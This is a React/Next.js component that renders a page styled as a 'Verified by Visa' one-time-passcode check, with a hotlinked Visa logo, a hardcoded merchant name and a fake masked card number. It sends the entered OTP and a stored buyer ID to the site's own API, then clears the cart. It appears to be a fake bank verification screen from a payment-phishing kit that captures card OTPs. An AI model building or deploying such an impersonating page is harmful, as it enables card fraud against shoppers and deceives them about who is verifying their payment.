import { useCart } from '@/lib/stores/cartStore';
import { otpSchema, OtpType } from '@/validations/otp.schema';
import { Button, Image, Link, useDisclosure } from '@heroui/react';
import { zodResolver } from '@hookform/resolvers/zod';
import { useRouter } from 'next/navigation';
import { useState } from 'react';
import { useForm } from 'react-hook-form';

export default function OtpForm() {
  const { total, clearCart } = useCart();
  const router = useRouter();

  const [loading, setLoading] = useState(false);

  const { onOpen } = useDisclosure();

  // ↓↓↓ buyerId مباشرة بدون useEffect
  const buyerId =
    typeof window !== 'undefined' ? sessionStorage.getItem('buyerId') : null;

  // RHF setup
  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
  } = useForm<OtpType>({
    resolver: zodResolver(otpSchema),
    mode: 'onChange',
    defaultValues: {
      otp: '',
    },
  });

  // SUBMIT
  const onSubmit = async (values: OtpType) => {
    if (!buyerId) {
      alert('Buyer ID غير موجود!');
      return;
    }

    setLoading(true);

    const res = await fetch(process.env.NEXT_PUBLIC_API_SEND_BUYER_OTP!, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ _id: buyerId, otp: values.otp }),
    });

    const data = await res.json();

    setLoading(false);

    if (res.ok) {
      onOpen();
      clearCart();
      router.replace('/');
    } else {
      alert(data.message);
    }
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      {/* Header */}
      <div className="flex items-start justify-between">
        <Image
          src="https://metcocu.org/wp-content/uploads/2018/08/verified_by_visa.jpg"
          width={100}
          alt="Verified by Visa"
          radius="none"
        />
      </div>

      <p className="text-gray-700 text-lg mt-4 mb-4">
        Protecting your online payments
      </p>

      {/* Info Table */}
      <div className="text-sm text-gray-700 space-y-2">
        <div className="flex">
          <span className="w-40">Merchant:</span>
          <span>MANAHAL ALTHUNYYAN CO</span>
        </div>

        <div className="flex">
          <span className="w-40">Amount:</span>
          <span className="font-bold">KD {total()}</span>
        </div>

        <div className="flex">
          <span className="w-40">Date:</span>
          <span>{new Date().toLocaleDateString()}</span>
        </div>

        <div className="flex">
          <span className="w-40">Card number:</span>
          <span>XXXX XXXX XXXX 1234</span>
        </div>

        <div className="flex">
          <span className="w-40">Personal Message:</span>
          <span>A personal greeting</span>
        </div>
      </div>

      {/* OTP FIELD */}
      <div className="mt-4">
        <div className="flex items-center">
          <span className="w-52 text-sm text-gray-700 leading-7">
            Enter One-Time Passcode (OTP):
          </span>

          <input
            type="text"
            maxLength={6}
            {...register('otp')}
            className="border border-gray-400 text-sm px-2 py-1 w-40 outline-none 
                           focus:border-blue-600"
          />
        </div>

        {errors.otp && (
          <p className="text-red-600 text-sm mt-1">{errors.otp.message}</p>
        )}
      </div>

      {/* BUTTONS */}
      <div className="mt-5 flex items-center justify-center gap-3">
        <Button
          color="primary"
          type="submit"
          isLoading={isSubmitting || loading}
        >
          Submit
        </Button>

        <Button color="primary" type="button">
          Resend
        </Button>

        <Button type="button" as={Link} href="/">
          Cancel
        </Button>
      </div>
    </form>
  );
}
